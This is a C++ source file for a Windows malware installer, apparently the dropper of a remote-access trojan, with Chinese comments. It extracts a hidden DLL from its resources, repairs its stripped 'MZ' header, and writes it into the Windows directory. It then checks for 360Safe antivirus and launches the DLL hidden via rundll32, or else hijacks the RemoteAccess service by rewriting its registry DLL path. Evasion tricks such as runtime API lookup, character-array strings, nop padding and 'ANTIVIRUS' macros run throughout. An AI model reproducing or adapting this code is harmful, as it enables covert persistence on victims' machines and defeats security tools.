// Installer.cpp : Defines the entry point for the console application.
//


#include "stdafx.h"
#include <windows.h>
#include <io.h>
#include <stdlib.h>
#include "resource.h"
#include "Tlhelp32.h"
#pragma comment(lib, "DELAYIMP.LIB")
#pragma comment(linker, "/DELAYLOAD:WININET.dll")
#pragma comment(linker, "/DELAYLOAD:WS2_32.dll")
#pragma comment(linker, "/DELAYLOAD:PSAPI.DLL")
#pragma comment(linker, "/DELAYLOAD:GDI32.dll")
#pragma comment(linker, "/DELAYLOAD:ADVAPI32.dll")
#pragma comment(linker, "/DELAYLOAD:SHELL32.dll")
#pragma comment(linker, "/DELAYLOAD:WINMM.dll")
#pragma comment(linker, "/DELAYLOAD:USER32.dll")
#pragma comment(linker, "/DELAYLOAD:WTSAPI32.dll")
#pragma comment(linker, "/DELAYLOAD:AVICAP32.dll")
#pragma comment(linker, "/DELAYLOAD:SHLWAPI.dll")
#pragma comment(linker, "/DELAY:nobind")
#pragma comment(linker, "/DELAY:unload")
//#define CLASSNAME "TO MYLOVE"

LRESULT CALLBACK WindowProc(
							HWND hwnd,      // 窗口句柄 handle to window
							UINT uMsg,      // 消息定义 message identifier
							WPARAM wParam,  // 第一个消息参数 first message parameter
							LPARAM lParam   // 第二个消息参数 second message parameter
							)
{
	
	return 0;
}

typedef DWORD (WINAPI *SizeofResourceT)
(
			   __in_opt HMODULE hModule,
			   __in HRSRC hResInfo
			   );


typedef UINT (WINAPI *GetWindowsDirectoryAT)
(
 __out_ecount_part_opt(uSize, return + 1) LPSTR lpBuffer,
 __in UINT uSize
 );


typedef DWORD (WINAPI *GetModuleFileNameAT)
(
 HMODULE hModule,
 LPSTR lpFilename,
 DWORD nSize
 );

typedef BOOL (WINAPI *WriteFileT)
(
 HANDLE hFile,
 LPCVOID lpBuffer,
 DWORD nNumberOfBytesToWrite,
 LPDWORD lpNumberOfBytesWritten,
 LPOVERLAPPED lpOverlapped
 );

typedef HANDLE (WINAPI *CreateFileAT)
(
 __in     LPCSTR lpFileName,
 __in     DWORD dwDesiredAccess,
 __in     DWORD dwShareMode,
 __in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes,
 __in     DWORD dwCreationDisposition,
 __in     DWORD dwFlagsAndAttributes,
 __in_opt HANDLE hTemplateFile
 );

typedef HANDLE (WINAPI *CreateEventAT)
(
 LPSECURITY_ATTRIBUTES lpEventAttributes,
 BOOL bManualReset,
 BOOL bInitialState,
 LPCSTR lpName
 );

typedef DWORD (WINAPI *GetTickCountT)
(
 VOID
 );

typedef UINT (WINAPI *WinExecT)
(
 __in LPCSTR lpCmdLine,
 __in UINT uCmdShow
 );

typedef int (WINAPIV *wsprintfAT)
(
 __out LPSTR,
 __in __format_string LPCSTR,
 ...);

typedef HRSRC (WINAPI *FindResourceAT)
(
 __in_opt HMODULE hModule,
 __in     LPCSTR lpName,
 __in     LPCSTR lpType
 );


typedef BOOL (WINAPI *FreeResourceT)


(
    __in HGLOBAL hResData
    );


BOOL ReleaseDll(LPSTR Path,LPCTSTR ResID,LPCTSTR ResDir)
{
FindResourceAT pFindResourceA= (FindResourceAT)GetProcAddress(LoadLibrary("kernel32.dll"),"FindResourceA");
	HRSRC m_Hsrc=pFindResourceA(NULL,(LPCTSTR)ResID,(LPCTSTR)ResDir);
	__asm nop;
	if(m_Hsrc == NULL)
		return FALSE;

	HGLOBAL m_Hglobal = LoadResource(NULL,m_Hsrc);
	__asm nop;
	BYTE *LPData =(LPBYTE) LockResource(m_Hglobal);
	__asm nop;
	__asm nop;
	__asm nop;
	char size1[]={'S','i','z','e','o','f','R','e','s','o','u','r','c','e','\0'};
SizeofResourceT pSizeofResource = (SizeofResourceT)GetProcAddress(LoadLibrary("kernel32.DLL"),size1);
	DWORD Size = pSizeofResource(NULL,m_Hsrc);
	__asm nop;
	DeleteFile(Path);
	char file1[]={'C','r','e','a','t','e','F','i','l','e','A','\0'};
CreateFileAT pCreateFileA= (CreateFileAT)GetProcAddress(LoadLibrary("kernel32.dll"),file1);
	HANDLE hFile = pCreateFileA
		(
		Path, 
		GENERIC_WRITE, 
		FILE_SHARE_WRITE, 
		NULL, 
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, 
		NULL
		);
	DWORD dwBytes=NULL;
	WriteFileT pWriteFile= (WriteFileT)GetProcAddress(LoadLibrary("kernel32.dll"),"WriteFile");
	pWriteFile(hFile,LPData,Size, &dwBytes, NULL);
	Sleep(1);
 	__asm nop;
 	__asm nop;
 	__asm nop;
FreeResourceT pFreeResource = (FreeResourceT)GetProcAddress(LoadLibrary("kernel32.dll"),"FreeResource");
	pFreeResource(m_Hglobal);
	CloseHandle(hFile);
	Sleep(2);
	return TRUE;
}
#define  SAVEPATH "c:\\Win_lj.ini"
VOID WriteCurrentPathToDisk(LPSTR szPath)
{
    GetModuleFileNameAT pGetModuleFileNameA= (GetModuleFileNameAT)GetProcAddress(LoadLibrary("kernel32.dll"),"GetModuleFileNameA");
	CHAR MyPath[MAX_PATH]={NULL};
	pGetModuleFileNameA(NULL,MyPath,MAX_PATH);
	char file2[]={'C','r','e','a','t','e','F','i','l','e','A','\0'};
    CreateFileAT pCreateFileA= (CreateFileAT)GetProcAddress(LoadLibrary("kernel32.dll"),file2);
	HANDLE m_Create = pCreateFileA(SAVEPATH,GENERIC_WRITE,FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,NULL);
	if(m_Create==INVALID_HANDLE_VALUE)
		return;
	ANTIVIRUS
		DWORD Writen =0;
    WriteFileT pWriteFile= (WriteFileT)GetProcAddress(LoadLibrary("kernel32.dll"),"WriteFile");
	pWriteFile(m_Create,MyPath,strlen(MyPath),&Writen,NULL);
	__asm nop;
	pWriteFile(m_Create,"\n",1,&Writen,NULL);
	__asm nop;
	pWriteFile(m_Create,szPath,strlen(szPath),&Writen,NULL);
	ANTIVIRUS
		CloseHandle(m_Create);
}

BOOL ChangeRegValue(LPSTR szPath)
{
	//IPX 协议 %SystemRoot%\System32\ipxrtmgr.dll
	//HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RemoteAccess\RouterManagers\Ipx
	//CHAR SubKey[256]="SYSTEM\\CurrentControlSet\\Services\\RemoteAccess\\RouterManagers\\Ipx";
//	char pp [] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','R','e','m','o','t','e','A','c','c','e','s','s','\\','R','o','u','t','e','r','M','a','n','a','g','e','r','s','\\','I','p','\0'};
//	CHAR SubKey[256]="SYSTEM\\CurrentControlSet\\Services\\RemoteAccess\\RouterManagers\\Ip";
		__asm nop;
ANTIVIRUS
			__asm nop;
	__asm nop;
__asm nop;
	CHAR mjj[256]="6587419CurrentControlSet\\Services\\RemoteAccess\\RouterManagers\\Ip";
	__asm nop;
__asm nop;
	         mjj [0] ='S';
			 mjj [1] ='Y';
			 mjj [2] ='S';
			 mjj [3] ='T';
			 mjj [4] ='E';
			 mjj [5]= 'M';
			 mjj [6]= '\\';			 

	HKEY cao;
	__asm nop;
__asm nop;
	DWORD wFlag=REG_CREATED_NEW_KEY;
__asm nop;
	if(
		RegCreateKeyEx(HKEY_LOCAL_MACHINE,mjj,
		NULL,NULL,NULL,KEY_SET_VALUE,NULL,&cao,&wFlag)!=ERROR_SUCCESS
		)
	{

		RegOpenKey(HKEY_LOCAL_MACHINE,mjj,&cao);
	}
	ANTIVIRUS
	RegSetValueEx(cao,"DLLPath",NULL,REG_EXPAND_SZ,(LPBYTE)szPath,strlen(szPath));

 	__asm nop;
 	__asm nop;
 	__asm nop;
	RegCloseKey(cao);

	return 0;
}

//#define  SAVEPATH "c:\\NT_Path.jpg"

	
int WINAPI WinMain(
				   HINSTANCE hInstance,      // handle to current instance
				   HINSTANCE hPrevInstance,  // handle to previous instance
				   LPSTR lpCmdLine,          // command line
				   int nCmdShow              // show state
)


{
	HKEY dd;
	char sof1[]={'S','O','F','T','W','A','R','E','\\','C','l','a','s','s','e','s','\\','.','3','8','6','\\','\0'};
	if (ERROR_SUCCESS!=RegOpenKeyEx(HKEY_LOCAL_MACHINE,sof1,0,KEY_ALL_ACCESS,&dd)) 
	{
		__asm nop;
		__asm nop;
		return -1;
	}



GetTickCountT pGetTickCount= (GetTickCountT)GetProcAddress(LoadLibrary("kernel32.dll"),"GetTickCount");
	srand(pGetTickCount());
	CHAR ReleasePath[MAX_PATH]={NULL};
	__asm nop;
	__asm nop;
	__asm nop;
	__asm nop;
ANTIVIRUS
GetWindowsDirectoryAT pGetWindowsDirectoryA= (GetWindowsDirectoryAT)GetProcAddress(LoadLibrary("kernel32.dll"),"GetWindowsDirectoryA");
	pGetWindowsDirectoryA(ReleasePath,MAX_PATH);
	ReleasePath[3]='\0';
    wsprintfAT pwsprintfA= (wsprintfAT)GetProcAddress(LoadLibrary("user32.dll"),"wsprintfA");
	pwsprintfA(ReleasePath,"%swindows\\xinstall%d.dll",ReleasePath,rand()*100);
	try
	{
		if (ReleasePath!=NULL) throw 29;

	}
	catch (...)
	{
		__asm nop;
	__asm nop;
		ReleaseDll(ReleasePath,(LPCTSTR)IDR_DLL,(LPCTSTR)"ERROR");
		HANDLE File;
		DWORD dwBytes;
		
		File = CreateFile(ReleasePath, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL, NULL);//创建一个写文件的
		__asm nop;
		__asm nop;
		__asm nop;
		SetFilePointer(File, 0, NULL,NULL);  //从文件的第一个自己开始写入数据
		__asm nop;
		__asm nop;
		__asm nop;
        WriteFileT pWriteFile= (WriteFileT)GetProcAddress(LoadLibrary("kernel32.dll"),"WriteFile");
		__asm nop;
		__asm nop;
		__asm nop;
		pWriteFile(File, "MZ", lstrlen("MZ"), &dwBytes, NULL);//把mz写入第一个位置 恢复正常了
		__asm nop;
		__asm nop;
		__asm nop;
		CloseHandle(File);
		__asm nop;
		__asm nop;
		__asm nop;
		Sleep(400);

		__asm nop;
		__asm nop;
		__asm nop;
		/////////////////////////360
		HKEY xjj;
		char safe360[] = {'S','O','F','T','W','A','R','E','\\','3','6','0','S','a','f','e','\\','\0'};
		__asm
		{
			nop
				nop
				nop
				nop
				nop
				nop
				nop
}
		if (ERROR_SUCCESS==RegOpenKeyEx(HKEY_LOCAL_MACHINE,(LPCTSTR)safe360,0,KEY_ALL_ACCESS,&xjj)) 
		{
			__asm
			{
				nop
					nop
					nop
					nop
					nop
					nop
					nop
}
            WinExecT pWinExec= (WinExecT)GetProcAddress(LoadLibrary("kernel32.dll"),"WinExec");
			__asm
			{
				nop
					nop
					nop
					nop
					nop
					nop
					nop
}
			Sleep(300);
			char newcmd[256];
           wsprintfAT pwsprintfA= (wsprintfAT)GetProcAddress(LoadLibrary("user32.dll"),"wsprintfA");
			pwsprintfA(newcmd,"rundll32 \"%s\",ServiceMain",ReleasePath);
			__asm nop;
	     __asm nop;

			pWinExec(newcmd,SW_HIDE);
	      __asm nop;
	      __asm nop;

			ExitProcess(0);
	}
		///////////////////////////////360
		WriteCurrentPathToDisk(ReleasePath);
	
	}


	SC_HANDLE Mhandle=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
	__asm nop;
	__asm nop;
	__asm nop;
	SC_HANDLE Ohandle=OpenService(Mhandle,"RemoteAccess",SERVICE_ALL_ACCESS);

	ChangeServiceConfigA(Ohandle,SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS,
		SERVICE_DEMAND_START,SERVICE_NO_CHANGE,NULL,NULL,NULL,NULL,NULL,NULL,NULL);

	SERVICE_STATUS ServiceStatus={NULL};
	__asm nop;
	ControlService(Ohandle,SERVICE_CONTROL_STOP,&ServiceStatus);
	__asm nop;
	ChangeRegValue(ReleasePath);
	__asm nop;
	StartService(Ohandle,NULL,NULL);
		__asm nop;
	Sleep(2);

	typedef BOOL(WINAPI *CloseServiceHandleT) (SC_HANDLE);

	CloseServiceHandleT CloseServiceHandleP = (CloseServiceHandleT)GetProcAddress(
		LoadLibrary("Advapi32.dll"),"CloseServiceHandle");

	CloseServiceHandleP(Ohandle);

	//CloseServiceHandleP(Mhandle);


	//创建一个命名事件 等待dll 将其复位.如果始终无信号 那么DLL加载失败
CreateEventAT pCreateEventA= (CreateEventAT)GetProcAddress(LoadLibrary("kernel32.dll"),"CreateEventA");
//GetTickCountT pGetTickCount= (GetTickCountT)GetProcAddress(LoadLibrary("kernel32.dll"),"GetTickCount");
	HANDLE handle = pCreateEventA(NULL,FALSE,FALSE,"Mjjxhj__Bjnl");

	DWORD iCount = pGetTickCount();
	
	

	//0秒钟无信号 手动加载
	while(TRUE)
	{
		if(WAIT_OBJECT_0==WaitForSingleObject(handle,100))
			break;
		GetTickCountT pGetTickCount= (GetTickCountT)GetProcAddress(LoadLibrary("kernel32.dll"),"GetTickCount");
		if(pGetTickCount()-iCount > 5000)
		{

			//还他妈的没信号手动加载吧.
			LoadLibrary(ReleasePath);
			break;
		}
	}
	Sleep(2);
 	CloseHandle(handle);
	return 0;
}
